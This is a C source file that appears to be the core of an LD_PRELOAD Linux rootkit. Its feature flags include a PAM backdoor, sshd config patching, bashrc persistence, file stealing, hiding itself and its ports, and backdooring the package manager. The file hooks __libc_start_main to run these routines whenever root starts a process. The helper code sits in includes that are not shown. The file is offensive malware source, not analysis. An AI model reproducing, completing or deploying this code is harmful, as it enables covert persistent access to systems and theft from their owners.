#define _GNU_SOURCE

#include "config.h"

#if !defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
#error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is"
#endif
#if defined USE_PAM_BD && !defined PATCH_SSHD_CONFIG
#warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG"
#endif
#if defined ROOTKIT_BASHRC && !defined USE_PAM_BD
#error "USE_PAM_BD is not defined while ROOTKIT_BASHRC is"
#endif
#if !defined ROOTKIT_BASHRC && defined USE_PAM_BD
#warning "USE_PAM_BD is enabled without ROOTKIT_BASHRC"
#endif

#if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
#warning "GID changing is not safely possible without BACKDOOR_UTIL defined"
#endif

#if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
#error "AUTO_GID_CHANGER defined without READ_GID_FROM_FILE"
#endif

#if defined BACKDOOR_PKGMAN && !defined BACKDOOR_UTIL
#error "BACKDOOR_PKGMAN defined without BACKDOOR_UTIL"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifdef HIDE_SELF
#include <utime.h>
#include <sys/time.h>
#endif

#ifdef HIDE_PORTS
#include <linux/netlink.h>
#include <pcap/pcap.h>
#endif

#include <pwd.h>
#include <shadow.h>

#ifdef USE_PAM_BD
#include <utmp.h>
#include <utmpx.h>
#endif

#if defined USE_PAM_BD || defined LOG_LOCAL_AUTH
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#endif

#define LINE_MAX 2048

typedef struct {
    void *(*func)();
} syms;

#define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])

#include "includes.h"


int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    if(not_user(0) || rknomore())
        goto do_libc_start_main;

#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
    cleanstolen();
#endif
#ifdef CLEANSE_HOMEDIR
    bdvcleanse();
#endif
#ifdef ROOTKIT_BASHRC
    checkbashrc();
#endif
#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
    gidchanger();
#endif
#ifdef DO_REINSTALL
    reinstall();
#endif
#ifdef PATCH_SSHD_CONFIG
    sshdpatch(REG_USR);
#endif

do_libc_start_main:
    hook(C__LIBC_START_MAIN);
    return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
